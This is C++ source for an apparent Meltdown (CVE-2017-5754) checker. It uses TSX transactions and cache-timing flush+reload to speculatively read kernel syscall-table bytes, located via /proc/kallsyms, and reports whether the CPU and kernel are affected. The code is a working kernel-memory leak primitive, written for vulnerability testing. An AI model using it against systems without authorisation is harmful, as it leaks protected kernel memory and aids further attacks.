/*
 * Copyright (c) 2018, Raphael S. Carvalho <raphael.scarv@gmail.com>
 * All rights reserved.
 *
 *Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 * 
 * 1. Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

#include <cstdio>
#include <unordered_map>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <limits>
#include <algorithm>
#include <sys/mman.h>
#include <immintrin.h>
#include <errno.h>
#include <unistd.h>
#include "assembly_utils.hh"

#define __DEBUG__

static constexpr size_t total_pages = 256;
static const char* syscall_table_symbol = "sys_call_table";
static const char* syscall_table_symbol_entry_prefix = "sys_";
// TODO: include linux header that define amount of addresses to read.
static constexpr unsigned syscall_table_entries = 10;
static constexpr size_t syscall_table_entry_read_retries = 5;

static inline unsigned page_size() {
    static unsigned __page_size = 0;
    if (!__page_size) {
        __page_size = getpagesize();
    }
    return __page_size;
}

static inline unsigned mem_size() {
    return total_pages * page_size();
}

//
// Retrieves one byte from syscall table at address ptr.
//
static unsigned char probe_one_syscall_table_address_byte(uintptr_t ptr, char* buf) {
    std::array<unsigned long, total_pages> durations;
    int min_duration = 0;

    for (auto c = 0; c < syscall_table_entry_read_retries; c++) {
        durations = { 0 };

        for (auto i = 0; i < total_pages; i++) {
            __clflush(&buf[i * page_size()]);
        }

        // Speculatively read byte from kernel address and execute a dependent instruction on
        // buf[read byte * 4096] which makes L1 cache it.
        // Subsequently, we measure access time for i={0..255} buf[i * 4096], and we assume
        // the one with fastest access is the byte read from the address in the kernel.
        if (_xbegin() == _XBEGIN_STARTED) {
            __speculative_byte_load(ptr, buf);
            _xend();
        } else {
            // nothing
        }

        for (auto i = 0; i < total_pages; i++) {
            durations[i] = __measure_load_execution(&buf[i * page_size()]);

            min_duration = (durations[min_duration] <= durations[i]) ? min_duration : i;
        }
    }
    return (unsigned char)(min_duration);
}

//
// Syscall table is valid if any entry matches the address in the symbol map.
//
static bool validate_syscall_table_entry(const void* data, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
    uint64_t* entry = (uint64_t*) data;
    uintptr_t ptr = reinterpret_cast<uintptr_t>(entry[0]);

    printf("0x%016lx -> That's %s\n", (uintptr_t)ptr, symbol_map.count(ptr) ? symbol_map.at(ptr).c_str() : "unknown");

    if (symbol_map.count(ptr)) {
        auto symbol = symbol_map.at(ptr);
        std::transform(symbol.begin(), symbol.end(), symbol.begin(), ::tolower);
        auto ret = symbol.find(syscall_table_symbol_entry_prefix);
        if (ret > 0 || ret == std::string::npos) {
            return false;
        }
        return true;
    }
    return false;
}

//
// Checks if syscall table address actually stores a valid system call by consulting the symbol map.
//
static bool check_one_syscall_table_address(uintptr_t target_address, char* mem, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
    size_t address_size = sizeof(uintptr_t);
    unsigned char buffer[address_size];

    for (auto i = 0; i < address_size; i++) {
        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, mem);
    }
    return validate_syscall_table_entry(buffer, symbol_map);
}

//
// Builds a map of pointer to symbol from /proc/kallsyms
//
static std::unordered_map<uintptr_t, std::string> build_symbol_map() {
    std::unordered_map<uintptr_t, std::string> symbol_map;

    std::ifstream infile("/proc/kallsyms");
    if (!infile.is_open()) {
        std::cout << "Failed to open /proc/kallsyms. Unable to proceed.\n";
        abort();
    }

    std::string line;

    while (std::getline(infile, line)) {
        std::istringstream iss(line);
        uintptr_t addr;
        std::string type, symbol;

        if (!(iss >> std::hex >> addr >> type >> symbol)) {
            std::cout << "error in line: " << line << std::endl;
            abort();
        } // error

        symbol_map.emplace(addr, std::move(symbol));
    }
    return symbol_map;
}

static uintptr_t symbol_map_reverse_search(const std::unordered_map<uintptr_t, std::string>& symbol_map, std::string symbol) {
    for (auto& p : symbol_map) {
        if (p.second == symbol) {
            return p.first;
        }
    }
    std::cout << "Unable to find symbol " << symbol << " in symbol map. Aborting...";
    abort();
}

static void require_TSX() {
    static constexpr int hle_mask = 1<<4;
    static constexpr int rtm_mask = 1<<11;

    unsigned eax = 7;
    unsigned ebx = 0;
    unsigned ecx = 0;

    __asm__ __volatile__ ( "movl %%ebx, %%esi\n"
                           "cpuid\n"
                           "movl %%ebx, %0\n"
                           "movl %%esi, %%ebx\n"
                           : "=a"(ebx) : "0" (eax), "c" (ecx) : "esi",
                           "ebx",
                           "edx"
                           );
    bool has_hle = (ebx & hle_mask) != 0;
    bool has_rtm = (ebx & rtm_mask) != 0;

    if (!has_hle || !has_rtm) {
        printf("Your cpu doesn't support TSX (Transactional Synchronization Extensions)\n" \
            "Check https://software.intel.com/en-us/node/524022 for details;\n");
        abort();
    }
}

int main(int argc, char** argv) {
    // TODO: do not require TSX to run checker anymore.
    require_TSX();

    auto mem = static_cast<char*>(mmap(nullptr, mem_size(), PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0));

    if (mem == MAP_FAILED) {
        printf("mmap() failed: %s\n", strerror(errno));
        return -1;
    }

    auto symbol_map = build_symbol_map();
    auto target_address = symbol_map_reverse_search(symbol_map, syscall_table_symbol);

    std::cout << "Checking whether system is affected by Variant 3: rogue data cache load (CVE-2017-5754), a.k.a MELTDOWN ...\n";

    printf("Checking syscall table (sys_call_table) found at address 0x%016lx ...\n", (uintptr_t)target_address);


    for (auto entry = 0; entry < syscall_table_entries; entry++) {
        auto ret = check_one_syscall_table_address(target_address + entry * sizeof(uintptr_t), mem, symbol_map);
        if (ret) {
            std::cout << "\nSystem affected! Please consider upgrading your kernel to one that is patched with KAISER\n";
            std::cout << "Check https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html for more details\n";
            goto out;
        }
    }
    std::cout << "\nSystem not affected. Congratulations!\n";
out:
    return munmap(static_cast<void*>(mem), mem_size());
}
